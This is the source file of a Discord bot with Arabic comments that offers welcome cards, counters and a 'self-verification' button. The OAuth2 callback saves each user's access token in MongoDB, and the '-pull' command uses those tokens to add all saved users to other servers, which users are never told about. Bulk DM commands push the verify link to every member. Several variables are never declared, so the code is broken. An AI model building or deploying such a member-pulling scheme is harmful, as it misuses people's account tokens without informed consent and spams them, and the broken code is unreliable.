const { 
    Client, 
    GatewayIntentBits, 
    ActionRowBuilder, 
    StringSelectMenuBuilder, 
    StringSelectMenuOptionBuilder, 
    EmbedBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    REST,
    Routes,
    PermissionFlagsBits,
    Events,
    ChannelType,
    MessageFlags
} = require('discord.js');
const express = require('express');
const axios = require('axios');
const mongoose = require('mongoose'); 
const { createCanvas, loadImage } = require('@napi-rs/canvas'); // مكتبة الرسم الفوري لبطاقات الترحيب والمغادرة الذهبية

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// ==================== إعداد وتوصيل قاعدة بيانات MongoDB السحابية ====================
const MONGO_URI = process.env.MONGO_URI; 

mongoose.connect(MONGO_URI)
    .then(() => console.log('Successfully connected to MongoDB Atlas!'))
    .catch(err => console.error('Failed to connect to MongoDB:', err));

const UserSchema = new mongoose.Schema({
    userId: { type: String, required: true, unique: true },
    accessToken: { type: String, required: true },
    username: { type: String },
    guildId: { type: String }
});

const VerifiedUser = mongoose.model('VerifiedUser', UserSchema);
// ====================================================================

// تعريف كائن البوت أولاً لضمان سلامة البناء
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildPresences
    ]
});

const tempSetup = new Map(); 
const dmSetup = new Map();
const verifyBroadcastSetup = new Map();

let liveCounterMessageId = null; 
let liveCounterChannelId = null; 
let logVerifyChannelId = null; 

// لتخزين القناة والرسالة لعداد -lca الجديد لجميع الأعضاء (قديم + جديد)
let lcaMessageId = null;
let lcaChannelId = null;

let autoJoinVerifyUrl = ''; 

// لتخزين قنوات الترحيب والمغادرة التلقائية (تدعم الإرسال في أكثر من روم بآن واحد)
const welcomeChannels = new Set();
const byeChannels = new Set();

// الأوامر المعتمدة
const TICKET_SETUP_PREFIX = '-st'; 
const DM_BROADCAST_PREFIX = '-t';   
const WELCOME_SETUP_PREFIX = '+wel';
const BYE_SETUP_PREFIX = '+Bye';
const EMBED_MESSAGE_SETUP_PREFIX = '+em'; 

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

// الصورة الفخمة المطلوب إرفاقها تلقائياً أسفل منشورات الإمبد
const EMBED_FOOTER_IMAGE_URL = 'https://cdn.discordapp.com/attachments/1521977140227211477/1521980487764148435/lv_0_.png?ex=6a46ce49&is=6a457cc9&hm=a629b2a4de8b6b23f5bc18eed10214224000ad8ac7ecd930ef81191177f81363&';

// دالة تفاعلية مساعدة لتحديث عدادات الـ Live الإحصائية تلقائياً
async function updateAllLiveCounters() {
    try {
        const totalCount = await VerifiedUser.countDocuments();

        if (liveCounterChannelId && liveCounterMessageId) {
            const counterChannel = client.channels.cache.get(liveCounterChannelId);
            if (counterChannel) {
                const counterMessage = await counterChannel.messages.fetch(liveCounterMessageId).catch(() => null);
                if (counterMessage) {
                    const updatedEmbed = new EmbedBuilder()
                        .setTitle('📊 عداد التحقق المباشر | Live Counter')
                        .setDescription(`🟢 تم تحديث العداد تلقائياً وبشكل حي!\n\n👥 العدد الإجمالي للأعضاء الموثقين والجاهزين للسحب في السيرفر هو:\n🌟 **\`${totalCount}\` عضو مفعّل** 🌟`)
                        .setColor('#2ecc71')
                        .setTimestamp();
                    await counterMessage.edit({ embeds: [updatedEmbed] }).catch(() => {});
                }
            }
        }

        if (lcaChannelId && lcaMessageId) {
            const counterChannel = client.channels.cache.get(lcaChannelId);
            if (counterChannel) {
                const counterMessage = await counterChannel.messages.fetch(lcaMessageId).catch(() => null);
                if (counterMessage) {
                    const updatedEmbed = new EmbedBuilder()
                        .setTitle('📈 عداد التوثيق الشامل | Universal Counter')
                        .setDescription(`🟢 تم التحديث التلقائي بشكل حي من قاعدة البيانات!\n\n📋 **إحصائية الأعضاء الكلية (قدامى + جدد):**\n🌟 إجمالي عدد الحسابات الموثقة داخل الرابط حالياً هو: **\`${totalCount}\` عضو** 🌟`)
                        .setColor('#3498db')
                        .setTimestamp();
                    await counterMessage.edit({ embeds: [updatedEmbed] }).catch(() => {});
                }
            }
        }
    } catch (e) {
        console.error('Error updating counters:', e);
    }
}

// دالة رسم البطاقة الذهبية الفخمة للأعضاء برمجياً (ترحيب ومغادرة)
async function generateGoldCard(member, title, subtitle, countText) {
    const canvas = createCanvas(700, 250);
    const ctx = canvas.getContext('2d');

    // الخلفية الداكنة الأنيقة
    ctx.fillStyle = '#141414';
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    // تدرج لوني ذهبي فخم للحواف والإطارات والمستطيلات
    const goldGrad = ctx.createLinearGradient(0, 0, 700, 250);
    goldGrad.addColorStop(0, '#bf953f');
    goldGrad.addColorStop(0.25, '#fcf6ba');
    goldGrad.addColorStop(0.5, '#b38728');
    goldGrad.addColorStop(0.75, '#fbf5b7');
    goldGrad.addColorStop(1, '#aa771c');

    ctx.strokeStyle = goldGrad;
    ctx.lineWidth = 8;
    ctx.strokeRect(5, 5, canvas.width - 10, canvas.height - 10);

    // كتابة النصوص بالذهب
    ctx.fillStyle = goldGrad;
    ctx.font = 'bold 36px Arial';
    ctx.fillText(title, 250, 95);

    ctx.fillStyle = '#ffffff';
    ctx.font = 'bold 26px Arial';
    ctx.fillText(member.user.username, 250, 140);

    ctx.fillStyle = '#8e8e8e';
    ctx.font = '16px Arial';
    ctx.fillText(subtitle, 250, 180);

    ctx.fillStyle = goldGrad;
    ctx.font = 'bold 18px Arial';
    ctx.fillText(countText, 250, 215);

    // رسم صورة العضو الدائرية بإطار ذهبي رائع
    try {
        const avatarUrl = member.user.displayAvatarURL({ extension: 'png', size: 256 });
        const avatarImage = await loadImage(avatarUrl);

        ctx.save();
        ctx.beginPath();
        ctx.arc(125, 125, 64, 0, Math.PI * 2, true);
        ctx.closePath();
        ctx.clip();
        ctx.drawImage(avatarImage, 61, 61, 128, 128);
        ctx.restore();

        // إطار ذهبي دائري حول الصورة
        ctx.strokeStyle = goldGrad;
        ctx.lineWidth = 4;
        ctx.beginPath();
        ctx.arc(125, 125, 64, 0, Math.PI * 2, true);
        ctx.stroke();
    } catch (e) {
        ctx.fillStyle = goldGrad;
        ctx.beginPath();
        ctx.arc(125, 125, 64, 0, Math.PI * 2, true);
        ctx.fill();
    }

    return canvas.toBuffer('image/png');
}

app.get('/', (req, res) => res.send('OAuth2 Verify & Broadcast Bot is Running!'));

app.get('/callback', async (req, res) => {
    const code = req.query.code;
    const guildId = req.query.state; 
    
    if (!code) {
        return res.send('<h1>❌ Verification Failed. Please try again.</h1>');
    }

    try {
        const tokenResponse = await axios.post('https://discord.com/api/v10/oauth2/token', new URLSearchParams({
            client_id: process.env.CLIENT_ID,
            client_secret: process.env.CLIENT_SECRET, 
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: `https://${req.hostname}/callback` 
        }), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const accessToken = tokenResponse.data.access_token;

        const userResponse = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: `Bearer ${accessToken}` }
        });

        const userId = userResponse.data.id;
        const username = userResponse.data.username;

        await VerifiedUser.findOneAndUpdate(
            { userId: userId },
            { accessToken: accessToken, username: username, guildId: guildId || 'Unknown' },
            { upsert: true, new: true }
        );

        if (logVerifyChannelId) {
            const logChannel = client.channels.cache.get(logVerifyChannelId);
            if (logChannel) {
                const logEmbed = new EmbedBuilder()
                    .setTitle('✅ عضو جديد أتم التحقق الذاتي')
                    .setColor('#2ecc71')
                    .addFields(
                        { name: '👤 العضو', value: `<@${userId}> | \`${username}\``, inline: true },
                        { name: '🆔 أيدي الحساب', value: `\`${userId}\``, inline: true }
                    )
                    .setTimestamp();
                await logChannel.send({ embeds: [logEmbed] }).catch(() => {});
            }
        }

        await updateAllLiveCounters();

        if (guildId) {
            const guild = client.guilds.cache.get(guildId);
            if (guild) {
                const member = await guild.members.fetch(userId).catch(() => null);
                if (member) {
                    const verifiedRole = guild.roles.cache.find(r => r.name === 'Verified');
                    if (verifiedRole) {
                        await member.roles.add(verifiedRole).catch(err => console.error(err));
                    }
                }
            }
        }

        res.send(`<h1>✅ Verified Successfully! Thank you ${username}. You can now close this tab.</h1>`);
    } catch (error) {
        console.error('Error during callback:', error.response ? error.response.data : error.message);
        res.send('<h1>❌ Error during verification.</h1>');
    }
});

app.listen(PORT, '0.0.0.0', () => console.log(`Server connected`));

const VERIFY_SETUP_PREFIX = '-vr';    
const COUNT_VERIFY_PREFIX = '-vf';    
const PULL_MEMBERS_PREFIX = '-pull';  
const LOG_VERIFY_PREFIX = '-tv';      
const LIVE_COUNTER_PREFIX = '-lc';    
const UNIVERSAL_COUNTER_PREFIX = '-lca'; 
const AUTO_DM_VERIFY_PREFIX = '-vj';

async function createVerifyRoles(guild) {
    try {
        let verifiedRole = guild.roles.cache.find(r => r.name === 'Verified');
        if (!verifiedRole) {
            await guild.roles.create({
                name: 'Verified',
                color: '#2ecc71',
                reason: 'Auto-created role for verified users'
            });
        }

        let ownerRole = guild.roles.cache.find(r => r.name === 'Ownerv');
        if (!ownerRole) {
            await guild.roles.create({
                name: 'Ownerv',
                color: '#e74c3c',
                permissions: [PermissionFlagsBits.Administrator],
                reason: 'Auto-created control role for verification administrators'
            });
        }
    } catch (error) {
        console.error(error);
    }
}

client.once(Events.ClientReady, async () => {
    console.log(`Verify & Broadcast Bot is Online as ${client.user.tag}`);
    client.guilds.cache.forEach(async (guild) => {
        await createVerifyRoles(guild);
    });
});

client.on(Events.GuildCreate, async (guild) => {
    await createVerifyRoles(guild);
});

// قراءة دخول الأعضاء (الترحيب الذهبي المطور برسم الكانفا)
client.on('guildMemberAdd', async member => {
    // 1. الترحيب ببطاقة ذهبية عالية الدقة بداخل الرومات المتعددة المحددة عبر +wel
    if (welcomeChannels.size > 0) {
        try {
            const imageBuffer = await generateGoldCard(member, 'Gold shop', 'GS • منور دخولك سيرفر', `Member #${member.guild.memberCount}`);
            
            welcomeChannels.forEach(async (channelId) => {
                const welcomeChannel = member.guild.channels.cache.get(channelId);
                if (welcomeChannel) {
                    await welcomeChannel.send({
                        content: `👋 منورررر يا ${member} سيرفر **Gold shop**، لا تنسى تقرأ القوانين وكل شيء! ✨`,
                        files: [{ attachment: imageBuffer, name: 'welcome-gold.png' }]
                    }).catch(() => {});
                }
            });
        } catch (err) {
            console.error(err);
        }
    }

    // 2. منح الرتب التلقائية الفورية للأعضاء
    const autoMemberRoleId = tempSetup.get('auto_member_role_id');
    if (autoMemberRoleId && !member.user.bot) {
        const role = member.guild.roles.cache.get(autoMemberRoleId);
        if (role) await member.roles.add(role).catch(console.error);
    }
});

// قراءة مغادرة الأعضاء (التوديع الذهبي المطور برسم الكانفا)
client.on('guildMemberRemove', async member => {
    if (byeChannels.size > 0) {
        try {
            const imageBuffer = await generateGoldCard(member, 'GOOD BYE', 'GS • نتمنى لك التوفيق دائماً', `Members remaining: ${member.guild.memberCount}`);
            
            byeChannels.forEach(async (channelId) => {
                const byeChannel = member.guild.channels.cache.get(channelId);
                if (byeChannel) {
                    await byeChannel.send({
                        content: `📤 غادرنا العضو **${member.user.username}** من سيرفر **Gold shop**...`,
                        files: [{ attachment: imageBuffer, name: 'bye-gold.png' }]
                    }).catch(() => {});
                }
            });
        } catch (err) {
            console.error(err);
        }
    }
});

client.on('messageCreate', async message => {
    if (message.author.bot) return;

    const content = message.content.trim();
    const isAuthorized = message.member.permissions.has(PermissionFlagsBits.Administrator) || message.member.roles.cache.some(r => r.name === 'Ownerv');

    if (embedTargetChannelIds.has(message.channel.id)) {
        try {
            const userMessageText = message.content;
            await message.delete().catch(() => {});
            await message.channel.send(`💖 شكراً لك يا ${message.author} على مشاركتك الممتازة في القناة!`);

            const embed = new EmbedBuilder()
                .setAuthor({ name: message.author.username, iconURL: message.author.displayAvatarURL({ dynamic: true }) })
                .setDescription(userMessageText || 'مشاركة فنية')
                .setColor('#bf953f')
                .setImage(EMBED_FOOTER_IMAGE_URL)
                .setTimestamp();

            await message.channel.send({ embeds: [embed] });
        } catch (err) {
            console.error('Error on Auto-Embed execution:', err);
        }
        return;
    }

    if (content === VERIFY_SETUP_PREFIX) {
        if (!isAuthorized) {
            return message.reply('❌ عذراً، هذا الأمر مخصص للإدارة أو أصحاب رتبة **Ownerv** فقط.');
        }

        const setupState = { step: 'get_url', messagesToDelete: [] };
        tempSetup.set(message.author.id, setupState);

        const prompt = await message.channel.send(`${message.author}, 🛡️ **يرجى كتابة أو لصق رابط التحقق (OAuth2 URL) الخاص بك الآن في الشات:**`);
        setupState.messagesToDelete.push(message.id, prompt.id);
        return;
    }

    if (tempSetup.has(message.author.id)) {
        const state = tempSetup.get(message.author.id);
        state.messagesToDelete.push(message.id);

        if (state.step === 'get_url') {
            const inputUrl = message.content.trim();
            if (!inputUrl.startsWith('http')) {
                const errPrompt = await message.reply('❌ رابط غير صحيح. يرجى لصق رابط OAuth2 صحيح يبدأ بـ http:');
                state.messagesToDelete.push(errPrompt.id);
                return;
            }

            verifyUrl = inputUrl;
            const finalUrl = `${verifyUrl}&state=${message.guild.id}`;

            const embed = new EmbedBuilder()
                .setTitle('🛡️ Server Verification / التحقق الذاتي')
                .setDescription('Please click the button below to verify yourself and get full access to the server.\n\nالرجاء الضغط على الزر أدناه لإتمام التحقق وتفعيل حسابك بالكامل بداخل السيرفر الحصول على رتبة **Verified**.')
                .setColor('#2b2d31');

            const verifyButton = new ButtonBuilder()
                .setLabel('Verify yourself')
                .setURL(finalUrl)
                .setStyle(ButtonStyle.Link)
                .setEmoji('✅');

            const row = new ActionRowBuilder().addComponents(verifyButton);
            await message.channel.send({ embeds: [embed], components: [row] });

            setTimeout(async () => {
                for (const msgId of state.messagesToDelete) {
                    await message.channel.messages.delete(msgId).catch(() => {});
                }
            }, 1000);

            tempSetup.delete(message.author.id);
            return;
        }
    }

    if (content.startsWith(AUTO_DM_VERIFY_PREFIX)) {
        if (!isAuthorized) return;
        const newUrl = content.replace(AUTO_DM_VERIFY_PREFIX, '').trim();
        if (!newUrl || !newUrl.startsWith('http')) {
            return message.reply('❌ يرجى وضع رابط الـ OAuth2 الصحيح للتحقق (مثال: `-vj https://discord.com/...`):');
        }
        autoJoinVerifyUrl = newUrl;
        await message.reply('✅ **تم بنجاح حفظ وتفعيل ميزة الإرسال التلقائي للرابط للخاص فور دخول الأعضاء الجدد!**');
        await message.delete().catch(() => {});
        return;
    }

    if (content.startsWith(LOG_VERIFY_PREFIX)) {
        if (!isAuthorized) return;

        const args = content.slice(LOG_VERIFY_PREFIX.length).trim().split(/ +/);
        const channelMention = message.mentions.channels.first();
        const inputId = args[0];

        const targetChannel = channelMention || message.guild.channels.cache.get(inputId);

        if (!targetChannel || targetChannel.type !== ChannelType.GuildText) {
            return message.reply('❌ يرجى منشن قناة نصية صحيحة أو وضع الأيدي لتعيين قناة لوج التحقق:');
        }

        logVerifyChannelId = targetChannel.id;
        await message.reply(`✅ **تم بنجاح تعيين قناة لوج التحقق على: ${targetChannel}**`);
        await message.delete().catch(() => {});
        return;
    }

    if (content === LIVE_COUNTER_PREFIX) {
        if (!isAuthorized) return;

        try {
            const totalCount = await VerifiedUser.countDocuments();
            const counterEmbed = new EmbedBuilder()
                .setTitle('📊 عداد التحقق المباشر | Live Counter')
                .setDescription(`🟢 جاري بدء المراقبة وتحديث الإحصائيات الحية...\n\n👥 العدد الإجمالي للأعضاء الموثقين والجاهزين للسحب في السيرفر هو:\n🌟 **\`${totalCount}\` عضو مفعّل** 🌟`)
                .setColor('#2ecc71')
                .setTimestamp();

            const sentMessage = await message.channel.send({ embeds: [counterEmbed] });
            liveCounterMessageId = sentMessage.id;
            liveCounterChannelId = message.channel.id;

            await message.reply('✅ **تم بنجاح تفعيل عداد التحقق المباشر في هذه القناة!**');
            await message.delete().catch(() => {});
        } catch (err) {
            console.error(err);
        }
        return;
    }

    if (content === UNIVERSAL_COUNTER_PREFIX) {
        if (!isAuthorized) return;

        try {
            const totalCount = await VerifiedUser.countDocuments();
            const lcaEmbed = new EmbedBuilder()
                .setTitle('📈 عداد التوثيق الشامل | Universal Counter')
                .setDescription(`🟢 جاري بدء المراقبة وجلب الإحصائيات الكلية للرابط...\n\n📋 **إحصائية الأعضاء الكلية (قدامى + جدد):**\n🌟 إجمالي عدد الحسابات الموثقة داخل الرابط حالياً هو: **\`${totalCount}\` عضو** 🌟`)
                .setColor('#3498db')
                .setTimestamp();

            const sentMessage = await message.channel.send({ embeds: [lcaEmbed] });
            lcaMessageId = sentMessage.id;
            lcaChannelId = message.channel.id;

            await message.reply('✅ **تم بنجاح تفعيل العداد الشامل في هذه القناة!**');
            await message.delete().catch(() => {});
        } catch (err) {
            console.error(err);
        }
        return;
    }

    if (content === COUNT_VERIFY_PREFIX) {
        if (!isAuthorized) return;
        try {
            const count = await VerifiedUser.countDocuments();
            await message.reply(`📊 **إحصائية التحقق المطور (MongoDB):**\nالعدد الكلي للأعضاء الموثقين المحفوظين والجاهزين للسحب هو: \`${count}\` عضو.`);
        } catch (err) {
            console.error(err);
            await message.reply('❌ حدث خطأ أثناء محاولة جلب الإحصائية من قاعدة البيانات.');
        }
        return;
    }

    if (content.startsWith(PULL_MEMBERS_PREFIX)) {
        if (!isAuthorized) return;

        const args = content.slice(PULL_MEMBERS_PREFIX.length).trim().split(/ +/);
        const targetGuildId = args[0] || message.guild.id; 

        try {
            const totalCount = await VerifiedUser.countDocuments();

            if (totalCount === 0) {
                return message.reply('❌ لا يوجد أي أعضاء موثقين مسجلين في قاعدة البيانات حالياً لسحبهم.');
            }

            const targetGuild = client.guilds.cache.get(targetGuildId);
            if (!targetGuild) {
                return message.reply('❌ البوت ليس موجوداً بداخل السيرفر المستهدف، يرجى دعوة البوت أولاً.');
            }

            const statusMsg = await message.channel.send(`⏳ **جاري جلب الأعضاء وبدء سحب وإدخال \`${totalCount}\` عضو إلى السيرفر المستهدف...**`);

            let successCount = 0;
            let failCount = 0;
            let alreadyInCount = 0;

            const allVerifiedUsers = await VerifiedUser.find();

            let index = 0;
            const interval = setInterval(async () => {
                if (index >= allVerifiedUsers.length) {
                    clearInterval(interval);
                    await statusMsg.edit(`✅ **اكتملت عملية سحب الأعضاء بنجاح!**\n\n📬 تم إدخال: \`${successCount}\` عضو.\n🔄 كانوا موجودين بالسيرفر سابقاً: \`${alreadyInCount}\` عضو.\n❌ فشل سحبهم (انتهى توكن حسابهم): \`${failCount}\` عضو.`);
                    return;
                }

                const userData = allVerifiedUsers[index];
                const isMember = targetGuild.members.cache.has(userData.userId);

                if (isMember) {
                    alreadyInCount++;
                } else {
                    try {
                        await axios.put(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${userData.userId}`, {
                            access_token: userData.accessToken
                        }, {
                            headers: {
                                Authorization: `Bot ${TOKEN}`,
                                'Content-Type': 'application/json'
                            }
                        });
                        successCount++;
                    } catch (err) {
                        failCount++;
                    }
                }

                await statusMsg.edit(`⏳ **جاري السحب الفوري للأعضاء...**\n\n📊 التقدم الحالي: \`${index + 1}/${allVerifiedUsers.length}\` عضو.\n✅ تم الإدخال: \`${successCount}\` | 🔄 موجود سابقاً: \`${alreadyInCount}\` | ❌ فشل: \`${failCount}\``);
                index++;
            }, 1200); 

        } catch (err) {
            console.error(err);
            await message.reply('❌ حدث خطأ غير متوقع أثناء محاولة بدء عملية السحب.');
        }
        return;
    }

    if (content === DM_BROADCAST_PREFIX) {
        if (!isAuthorized) return;

        const broadcastState = { step: 1, title: null, description: null, imageUrl: null, messagesToDelete: [] };
        dmSetup.set(message.author.id, broadcastState);

        const prompt = await message.channel.send(`${message.author}, 📢 **بدء إعداد برودكاست الخاص الذكي مع المنشن (أونلاين أولاً)**\n\n**الخطوة [1/3]:** يرجى كتابة **عنوان** رسالة البرودكاست:`);
        broadcastState.messagesToDelete.push(message.id, prompt.id);
        return;
    }

    if (dmSetup.has(message.author.id)) {
        const state = dmSetup.get(message.author.id);
        state.messagesToDelete.push(message.id);

        if (state.step === 1) {
            state.title = message.content.trim();
            state.step = 2;
            const prompt2 = await message.reply(`✅ تم حفظ العنوان.\n\n**الخطوة [2/3]:** يرجى كتابة **الوصف (محتوى الرسالة)**:`);
            state.messagesToDelete.push(prompt2.id);
            return;
        }

        if (state.step === 2) {
            state.description = message.content.trim();
            state.step = 3;
            const prompt3 = await message.reply(`✅ تم حفظ الوصف.\n\n**الخطوة [3/3] الأخيرة:** ضع رابط صورة للرسالة (أو اكتب \`لا\` للإلغاء):`);
            state.messagesToDelete.push(prompt3.id);
            return;
        }

        if (state.step === 3) {
            const input = message.content.trim();
            if (input.toLowerCase() !== 'لا' && input.startsWith('http')) {
                state.imageUrl = input;
            } else {
                state.imageUrl = null;
            }

            const statusMsg = await message.channel.send('⏳ **جاري بدء عملية البرودكاست التدريجي والآمن مع الإشارة للعضو (أونلاين أولاً)...**');

            setTimeout(async () => {
                for (const msgId of state.messagesToDelete) {
                    await message.channel.messages.delete(msgId).catch(() => {});
                }
            }, 1000);

            const members = await message.guild.members.fetch({ withPresences: true });
            const allMembers = Array.from(members.values()).filter(m => !m.user.bot);

            const onlineMembers = allMembers.filter(m => m.presence && m.presence.status !== 'offline');
            const offlineMembers = allMembers.filter(m => !m.presence || m.presence.status === 'offline');

            const sortedMembers = [...onlineMembers, ...offlineMembers];

            let sentCount = 0;
            let failedCount = 0;
            let index = 0;

            const interval = setInterval(async () => {
                if (index >= sortedMembers.length) {
                    clearInterval(interval);
                    await statusMsg.edit(`✅ **اكتمل البرودكاست بنجاح!**\n\n📬 تم الإرسال إلى: \`${sentCount}\` عضو.\n❌ فشل الإرسال لـ: \`${failedCount}\` عضو.`);
                    return;
                }

                const targetMember = sortedMembers[index];
                
                const personalEmbed = new EmbedBuilder()
                    .setTitle(state.title)
                    .setDescription(`👋 مرحباً بك يا ${targetMember}!\n\n${state.description}`)
                    .setColor('#5865F2')
                    .setTimestamp();

                if (state.imageUrl) {
                    personalEmbed.setImage(state.imageUrl);
                }

                try {
                    await targetMember.send({ embeds: [personalEmbed] });
                    sentCount++;
                } catch (err) {
                    failedCount++;
                }

                const progressType = index < onlineMembers.length ? '🟢 جاري إرسال المتصلين (Online)' : '⚫ جاري إرسال غير المتصلين (Offline)';
                await statusMsg.edit(`⏳ **${progressType}...**\n\n📊 التقدم الحالي: \`${index + 1}/${sortedMembers.length}\` عضو.\n✅ تم الإدانة: \`${sentCount}\` | ❌ فشل: \`${failedCount}\``);
                index++;
            }, 2500); 

            dmSetup.delete(message.author.id);
            return;
        }
    }

    if (content === DM_VERIFY_PREFIX) {
        if (!isAuthorized) return;

        const broadcastState = { step: 1, title: null, description: null, messagesToDelete: [] };
        verifyBroadcastSetup.set(message.author.id, broadcastState);

        const prompt = await message.channel.send(`${message.author}, 📢 **بدء إعداد برودكاست رابط التحقق الذاتي (أونلاين أولاً)**\n\n**الخطوة [1/2]:** يرجى كتابة **عنوان** رسالة التحقق:`);
        broadcastState.messagesToDelete.push(message.id, prompt.id);
        return;
    }

    if (verifyBroadcastSetup.has(message.author.id)) {
        const state = verifyBroadcastSetup.get(message.author.id);
        state.messagesToDelete.push(message.id);

        if (state.step === 1) {
            state.title = message.content.trim();
            state.step = 2;
            const prompt2 = await message.reply(`✅ تم حفظ العنوان.\n\n**الخطوة [2/2] الأخيرة:** يرجى كتابة **وصف وحث الأعضاء** على إتمام التحقق:`);
            state.messagesToDelete.push(prompt2.id);
            return;
        }

        if (state.step === 2) {
            state.description = message.content.trim();

            const statusMsg = await message.channel.send('⏳ **جاري بدء برودكاست رابط التحقق التدريجي والآمن مع الإشارة للعضو (أونلاين أولاً)...**');

            setTimeout(async () => {
                for (const msgId of state.messagesToDelete) {
                    await message.channel.messages.delete(msgId).catch(() => {});
                }
            }, 1000);

            const members = await message.guild.members.fetch({ withPresences: true });
            const allMembers = Array.from(members.values()).filter(m => !m.user.bot);

            const onlineMembers = allMembers.filter(m => m.presence && m.presence.status !== 'offline');
            const offlineMembers = allMembers.filter(m => !m.presence || m.presence.status === 'offline');

            const sortedMembers = [...onlineMembers, ...offlineMembers];

            let sentCount = 0;
            let failedCount = 0;
            let index = 0;

            const finalUrl = `${verifyUrl}&state=${message.guild.id}`;

            const verifyButton = new ButtonBuilder()
                .setLabel('Verify yourself')
                .setURL(finalUrl)
                .setStyle(ButtonStyle.Link)
                .setEmoji('✅');

            const row = new ActionRowBuilder().addComponents(verifyButton);

            const interval = setInterval(async () => {
                if (index >= sortedMembers.length) {
                    clearInterval(interval);
                    await statusMsg.edit(`✅ **اكتمل برودكاست رابط التحقق بنجاح!**\n\n📬 تم إرسال الرابط إلى: \`${sentCount}\` عضو.\n❌ فشل الإرسال لـ: \`${failedCount}\` عضو.`);
                    return;
                }

                const targetMember = sortedMembers[index];
                
                const personalEmbed = new EmbedBuilder()
                    .setTitle(state.title)
                    .setDescription(`👋 مرحباً بك يا ${targetMember}!\n\n${state.description}\n\nالرجاء الضغط على الزر أدناه لإتمام التحقق وتفعيل حسابك بالكامل بداخل السيرفر الحصول على رتبة **Verified**.\n\n🛡️ Server Verification / التحقق الذاتي`)
                    .setColor('#2b2d31')
                    .setTimestamp();

                try {
                    await targetMember.send({ embeds: [personalEmbed], components: [row] });
                    sentCount++;
                } catch (err) {
                    failedCount++;
                }

                const progressType = index < onlineMembers.length ? '🟢 جاري إرسال المتصلين (Online)' : '⚫ جاري إرسال غير المتصلين (Offline)';
                await statusMsg.edit(`⏳ **${progressType}...**\n\n📊 التقدم الحالي: \`${index + 1}/${sortedMembers.length}\` عضو.\n✅ تم الإدانة: \`${sentCount}\` | ❌ فشل: \`${failedCount}\``);
                index++;
            }, 2500); 

            verifyBroadcastSetup.delete(message.author.id);
            return;
        }
    }

    if (content.startsWith(EMBED_MESSAGE_SETUP_PREFIX)) {
        if (!isAuthorized) return;
        const channelMention = message.mentions.channels.first();
        if (!channelMention) return message.reply('❌ يرجى منشن روم المنشورات المخصص لتفعيله (مثال: `+em #روم-الصور`):');

        embedTargetChannelIds.add(channelMention.id);
        await message.reply(`✅ **تم بنجاح إضافة قناة المنشورات التلقائية المخصصة: ${channelMention}**`);
        await message.delete().catch(() => {});
        return;
    }

    if (content.startsWith(WELCOME_SETUP_PREFIX)) {
        if (!isAuthorized) return;
        const channelMention = message.mentions.channels.first();
        if (!channelMention) return message.reply('❌ يرجى منشن القناة لإضافتها لقائمة الترحيب (مثال: `+wel #روم-الترحيب`):');
        
        welcomeChannels.add(channelMention.id);
        await message.reply(`✅ **تم بنجاح إضافة قناة الترحيب: ${channelMention}**`);
        await message.delete().catch(() => {});
        return;
    }

    if (content.startsWith(BYE_SETUP_PREFIX)) {
        if (!isAuthorized) return;
        const channelMention = message.mentions.channels.first();
        if (!channelMention) return message.reply('❌ يرجى منشن القناة لإضافتها لقائمة المغادرة (مثال: `+Bye #روم-المغادرة`):');
        
        byeChannels.add(channelMention.id);
        await message.reply(`✅ **تم بنجاح إضافة قناة المغادرة: ${channelMention}**`);
        await message.delete().catch(() => {});
        return;
    }

    if (content === TICKET_SETUP_PREFIX) {
        if (!isAuthorized) return;

        const setupState = { 
            step: 'get_count',
            optionsCount: 0,
            currentOptionIndex: 0,
            options: [], 
            imageUrl: null,
            categoryId: null,
            messagesToDelete: [] 
        };
        tempSetup.set(message.author.id, setupState);

        const prompt = await message.channel.send(`${message.author}, ⚙️ **بدء إعداد بوكس تذاكر مخصص بالكامل**\n\n**الخطوة [1]:** كم عدد الأقسام (الخيارات) التي تريد وضعها في هذا البوكس؟ (اكتب رقماً من **1 إلى 10**):`);
        setupState.messagesToDelete.push(message.id, prompt.id);
        return;
    }
});

client.login(TOKEN);